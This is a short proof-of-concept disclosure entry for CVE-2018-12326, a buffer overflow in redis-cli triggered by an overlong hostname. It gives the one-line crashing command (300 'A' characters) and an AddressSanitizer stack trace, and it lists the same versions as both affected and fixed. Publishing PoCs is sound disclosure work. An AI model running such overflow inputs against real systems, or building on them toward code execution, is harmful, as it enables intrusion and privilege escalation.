# Exploit Title: Redis-cli < 5.0 - Buffer Overflow (PoC)
# Date: 2018-06-13
# Exploit Author: Fakhri Zulkifli
# Vendor Homepage: https://redis.io/
# Software Link: https://redis.io/download
# Version: 5.0, 4.0, 3.2
# Fixed on: 5.0, 4.0, 3.2
# CVE : CVE-2018-12326

# Buffer overflow in redis-cli of Redis version 3.2, 4.0, and 5.0 allows a local attacker
# to achieve code execution and escalate to higher privileges via a long string in the hostname parameter.

$ ./src/redis-cli -h `python -c 'print "A" * 300'`
Could not connect to Redis at AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:6379: Name or service not known

#0 0x4a4182 in vsnprintf /home/user/llvm/projects/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:1566
#1 0x4a42d0 in snprintf /home/user/llvm/projects/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:1637
#2 0x570159 in repl /home/user/redis/src/redis-cli.c:1624:5
#3 0x55ba77 in main /home/user/redis/src/redis-cli.c:6660:9
#4 0x7f6be5f6e82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
#5 0x4247a8 in _start (/home/user/redis/src/redis-cli+0x4247a8)